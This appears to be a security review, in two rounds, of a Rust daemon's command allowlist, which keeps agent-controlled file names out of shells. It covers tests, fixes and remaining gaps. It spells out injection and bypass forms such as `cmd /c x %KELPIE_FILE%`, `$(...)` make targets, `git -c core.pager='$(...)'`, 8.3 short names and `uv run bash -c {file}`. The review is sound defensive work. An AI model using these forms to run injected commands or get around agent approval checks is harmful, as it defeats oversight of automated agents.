## Final check (2026-10-25, allowlist design, current `D:\kelpie-par` tree)

The developer replaced the blocklist with an allowlist (`check_command` in `automations.rs:786-839`, with `RUNNERS`, `POWERSHELLS`, `POSIX_SHELLS`, `SCRIPT_INTERPRETERS`). Report only; no source changed.

### What I ran
| Check | Result |
|---|---|
| `cargo test -p kelpied automation` | 56/56 pass, including `the_reviewers_probes_cannot_be_saved`, `event_data_reaches_interpreters_only_as_the_data_of_a_script_file`, `editing_an_approved_script_needs_approval_again`, the commit-baseline, chain and real-script tests |
| `cargo clippy -p kelpied --all-targets -- -D warnings` | clean |
| `pnpm typecheck` / `pnpm i18n:check` | clean / 1902 keys, 0 missing |
| e2e | Not run (needs the app build); developer reports 86/86 twice |

### 1. B1/B2/B3

I did not re-run live spawn payloads this round; the three forms are now cargo-tested and the design makes them unreachable. Reading the allowlist confirms each is refused:

- **B1 `powershell ... lint.ps1 {file}` (no `-File`): refused.** PowerShell is routed through `powershell_script` (`automations.rs:751-768`), which walks only `-NoProfile|-NonInteractive|-NoLogo|-ExecutionPolicy <value>` and then requires `-File <x.ps1>`; any other token (including a bare script name) returns an error. `the_reviewers_probes_cannot_be_saved` asserts this exact form is rejected.
- **B2 `cmd /c x %KELPIE_FILE%`: refused.** `cmd` is in `RUNNERS`; `check_command:808` flags event data as either a `{placeholder}` OR any argument containing `KELPIE_` (case-insensitive), so a bare `%KELPIE_FILE%` is caught even with no placeholder. Tested.
- **B3 `ssh host ./x {file}`: refused.** `ssh` is in `RUNNERS`. Tested.

The error message names only the safe forms (`-File`, `bash script`, `python script`, a `.cmd` called directly) and never suggests `cmd /c` or `%VAR%`; a test asserts that too.

### 2. Allowlist bypass hunt

The default is the safe direction the controller asked about: a program that is not a runner, a PowerShell, a POSIX shell or a script interpreter gets placeholders as whole argv entries, which the standard library quotes. So the only concern is a program that re-parses one of its argv entries as code itself.

**Still blocking**

- **F1 (High). Build-command tools are not in `RUNNERS`, yet they shell out to run their targets.** `make`, `gmake`, `nmake`, `cmake` (`-P`, `-E`), `ninja`, `gradle`/`gradlew`, `mvn`, `msbuild`, `just`, `task`, `rake`, `mage`, `doit`, `invoke`, `scons`, `bazel`, `buck` are all classified as plain programs today, so they receive placeholders as whole arguments. Several of them run an argument (a target, a `-D`/`/p:` define, a recipe) through `/bin/sh -c` or `cmd /c`. "On a file change, run `make {file}`" is a plausible automation, and a hostile target name containing `$(...)` reaches the shell `make` spawns. `forfiles` is already in `RUNNERS` (good), which shows the category was considered but left incomplete.
  - **Verdict:** add the build tools above to `RUNNERS` (so event data refuses them), or adopt the controller's stronger option: flip the default so only an explicit known-safe set gets placeholders and every other program requires the user to confirm in the approval dialog that it does not re-parse arguments. I recommend adding to `RUNNERS` as the smaller change.

- **F2 (not blocking after reading the resolver).** Script files run under a Windows scripting host (`.js`, `.vbs`, `.wsf`, `.hta`) are a classic bypass, but `launchable_extensions` (`automations.rs:619`) cuts the resolvable set to `.com/.exe/.bat/.cmd`, and `with_extensions` on Windows requires the file's extension be in that list. So a program named `x.js`/`x.vbs`/`x.hta` resolves to "not found" and cannot run. Closed. Suggest a test that pins this (a program named `x.js` is "not found" on Windows) so a future PATHEXT change does not reopen it.

**Not agent-reachable, worth hardening (Low)**

- **N11. `git -c` config that runs a command, or `!` aliases.** `git -c core.pager='$(...)'` or an `!sh -c` alias runs a shell. The argv is author-written and `{file}` lands as a separate pathspec entry (data), so an agent cannot inject through it. Document it, or refuse a `-c` value containing `!` or `$(`.
- **N12. `vim -c`, `find -exec`, `tar --to-command`, `curl -K`, `rsync -e`, `code -`.** Each runs a command from an author-written flag; `{file}` cannot become that flag's value, so not agent-reachable. Consider refusing those flags for defence in depth.

### 3. The script-contents hash and TOCTOU

- **Right file hashed: yes.** `covered_files` (`automations.rs:854-878`) hashes the resolved program when it is inside the project, the interpreter's script (from `check_command`), and every argv entry that names an existing file (16-file, 4 MB cap). `command_hash` folds each file's path and digest in. `editing_an_approved_script_needs_approval_again` proves an edit to the script, or to the in-project program, flips `approved()` to false and the run is refused with "approve it again".
- **TOCTOU: real but narrow and within the documented model.** `start_shell` checks `approved()` (which re-reads and re-hashes every covered file), then `shell_plan` re-runs `check_command`, then spawns. A same-user process could swap the script between the final hash read and `CreateProcess`. This is inherent to any on-disk content hash, and the threat model (`architecture.md:73`) already states Kelpie is not a boundary against deliberate same-user code: an agent that can rewrite the script in that window can run it directly anyway. Not blocking. Worth a one-line code comment that the check guards against accidental drift, not a TOCTOU race.
- **PATH-only scripts: contents ARE covered.** `covered_files:867` adds `check_command`'s returned script whether it is in the project or on PATH, so a PATH script's bytes are hashed. Only the interpreter binary itself (e.g. `python.exe` on PATH) is not hashed, which is correct (it would churn on every toolchain update). This is slightly better than the developer's concern #1 wording suggests; acceptable.

### 4. N2-N10, chain, N4 tree-kill

| Item | Status | Evidence |
|---|---|---|
| N2 lookup cost | Fixed | `resolve_program:638-663`: per-(PATH,program) cache (hit forever, miss 30 s), lookup bounded to 2 s on a helper thread. |
| N4 kill only on timeout | Fixed | `start_shell` calls `tree.release()` on normal exit (`daemon/automation.rs:556-562`); `release` clears `KILL_ON_JOB_CLOSE` on Windows (`proc_tree.rs:117-122`), sets a released flag on Unix. Only `wait_command`'s timeout path kills the tree. Tested. |
| N5 commit baseline race | Fixed | `check_head` holds the `heads` lock across `head_of`+`observe`, and `knows()` means a baseline is taken only where there is none (`daemon/automation.rs:343-353`). Tested. |
| N6 chain without a live busy session | Fixed | Depth follows automations that ran in the folder within 2 minutes, kept per automation; a finished turn can only be caused by an agent-starting automation, window events by none. Tested. |
| N8 wrapper loop | Fixed | Gone: runners are refused outright, so nesting cannot bypass. |
| N9 older list runs during restore/refusal | Fixed | `due:1288` now checks `self.broken.is_none()`. |
| N10 git hardening | Fixed | `head_of` passes `-c core.hooksPath=/dev/null -c core.fsmonitor=false` and keeps the 10 s timeout (`automations.rs:1428`). |
| N1 approved repo script editable | Fixed | Now covered by the contents hash (section 3). |
| N3/N7 dialog wording | Fixed | Dialog shows resolved program, covered files, hash. |
| Chain limit `MAX_CHAIN = 3` | Present | With the N6 timing caveat (a coincidental fourth automation within 2 min is cut; the inbox says so). |

### 5. New holes

- **F1 (High):** `make`/`cmake`/`gradle`/`msbuild`-class build tools are not in `RUNNERS` and shell out to run targets; an agent-chosen `{file}` target can reach the shell.
- **F3 (Medium). Name-normalisation of the classifier input.** `program_stem` lowercases and strips one of `.exe/.cmd/.bat/.com`, so `CMD.EXE` and `Cmd` map to `cmd`. Gaps: (a) 8.3 short names - `POWERS~1.EXE` yields stem `powers~1`, not matched to `powershell`; (b) trailing dot or space - `"cmd."` / `"cmd "` (Windows trims these at launch, the stem keeps them). The resolved path is also classified, but `is_file()` on a `~1` path returns the path as given, so the stem stays `powers~1`. A runner or PowerShell presented this way is treated as a plain program and handed placeholders. Fix: `std::fs::canonicalize` the resolved path and trim trailing dots/spaces before `program_stem`.
- **N11-N13 (Low):** author-only argument-eval flags (`git -c`, `find -exec`, `tar --to-command`, `vim -c`, `rsync -e`, `curl -K`). Not reachable by an agent because `{file}` cannot become the flag's value.

Nothing I found lets an agent-controlled file name reach a shell through the tested interpreter/runner forms; the gaps are (F1) a class of build tools missing from the runner list and (F3) name-normalisation of the classifier input.

### Verdict

**Blocking:**
- **F1 (High):** add build-command runners (`make`, `gmake`, `nmake`, `cmake`, `ninja`, `gradle`, `gradlew`, `mvn`, `msbuild`, `just`, `task`, `rake`, `scons`, `bazel`, `mage`, `doit`, `invoke`) to `RUNNERS`, or adopt the confirm-for-unknown-program default. They shell out and are plausible file-trigger commands.
- **F3 (Medium, treat as blocking for a security gate):** canonicalize the resolved path and strip trailing dots/spaces before classifying, so 8.3 names and `cmd.`/`cmd ` cannot dodge the runner/PowerShell checks.

Everything the controller listed as a rule is implemented and tested, B1/B2/B3 are refused, the script-contents hash covers the right files (PATH scripts included), TOCTOU is within the documented same-user model, and all N2-N10 plus the chain and tree-kill fixes are verified. 56/56 tests, clippy clean, typecheck and i18n clean.

Status (final check round): DONE_WITH_CONCERNS. It is replaced by the Confirmation status below.
Summary (final check round): The allowlist refuses B1/B2/B3 (cargo-tested), covers script contents in the approval hash (PATH scripts included), and lands every N2-N10/chain/tree-kill fix (56/56 tests, clippy and typecheck clean). Two gaps remain before merge: build tools (make/cmake/gradle/msbuild/...) are not in the runner list yet shell out to run agent-reachable targets (F1, High), and 8.3 short names / trailing dot-or-space dodge the program classifier (F3, Medium). N11-N13 are non-agent-reachable hardening nits.

---

## Confirmation (2026-10-25, current `D:\kelpie-par` tree)

| Check | Result |
|---|---|
| `cargo test -p kelpied automation` | **59/59 pass**. The shared target held a stale `kelpied` test binary that cargo reported as "Fresh" (210 tests, 3 automation tests); after `cargo clean -p kelpied` the real build ran. |
| `cargo clippy -p kelpied --all-targets -- -D warnings` | clean |
| `pnpm typecheck` / `pnpm i18n:check` | clean / 1902 keys, 0 missing |

- **F1: fixed.** `RUNNERS` (`automations.rs:693-701`) now holds `npm`, `pnpm`, `yarn`, `corepack` and about 45 build tools and task runners (make/gmake/nmake/mingw32-make, cmake/ctest/cpack, gradle(w), mvn(w), ant, sbt, msbuild, ninja, meson, scons, bazel(isk), buck(2), just, rake, task, invoke, nox, tox, doit, mage, grunt, gulp, fastlane, …). Event data given to any of them is refused.
  - The developer's probe saw cmd.exe expand `%PATH%` inside `npm run`/`exec`. My earlier single probe (`npm run` of a `node` script) passed it literally. The difference no longer matters, because npm is now refused, and I withdraw my earlier "npm run is literal" claim.
- **F3: fixed.** `program_stem` ignores trailing dots and spaces. `program_stems` classifies by the given name, the resolved name, and the canonical name (`std::fs::canonicalize`, `\\?\` stripped), which expands 8.3 aliases. `an_8_3_short_name_is_the_program_it_names` really ran here (no "skipped" line): it copies a program as `powershell.exe` and `mingw32-make.exe`, calls it by its 8.3 name, and the call is refused.
- **Extension pin: present.** `scripting_host_files_are_never_programs` covers `.js/.vbs/.wsf/.hta/.lnk/.url/.ps1/…`.
- **TOCTOU comment: present.** `daemon/automation.rs:533-537` says what the hash guards (drift) and what it cannot guard (a same-user swap inside the window).

### New hole (blocking, one line)

- **F4. "Run a program" wrappers from Python/Ruby/Node toolchains are not runners.** Their siblings `npx`, `uvx`, `pipx` and `conda` are. Missing: `uv` (`uv run`), `poetry`, `pdm`, `hatch`, `rye`, `pipenv`, `pixi`, `bundle` (`bundle exec`), `mise`, `asdf`, `volta`, `fnm`, `nvm`, `direnv` (`exec`), `nix`/`nix-shell`, `dotenv`, `devbox`.
  - These pass their argument list to the named program unchanged, so `uv run bash -c {file}` puts the event data in the position of `-c`'s code. The allowlist refuses exactly that for a direct `bash -c` and for `env bash -c`.
  - This breaks the controller's rule that wrappers must not hide an interpreter.
  - **Fix:** add them to `RUNNERS`.

### Not blocking
- The default ("any other program gets placeholders as whole arguments") makes the name list a list that will always lag behind new tools. When convenient, consider the controller's stronger option: placeholders only for script-form interpreters, batch files called directly, in-project programs (whose contents are hashed), plus an explicit known-safe list.
- Classification is by name, so a copied or hard-linked interpreter with a neutral name is not recognised. The user writes the command, so the agent cannot reach this; the threat model accepts it.

### Verdict
**Blocking: F4 only.** It is a one-line addition to `RUNNERS`, plus a refused test case such as `uv run bash -c {file}`. F1, F3, the extension pin and the TOCTOU comment are verified. Once F4 lands, nothing else blocks the merge.

Status: DONE_WITH_CONCERNS
Summary: F1 (npm/pnpm/yarn and build tools are runners), F3 (canonical/8.3/trailing-dot classification, with a real 8.3 test that ran), the extension pin and the TOCTOU comment are verified (59/59 tests, clippy and typecheck clean). One small blocker remains: the "run a program" wrappers (`uv run`, `poetry`, `pdm`, `hatch`, `pipenv`, `bundle exec`, `mise`/`asdf`/`volta`/`fnm`, `direnv`/`nix`/`dotenv`) are not runners, so `uv run bash -c {file}` slips past the wrapper rule.
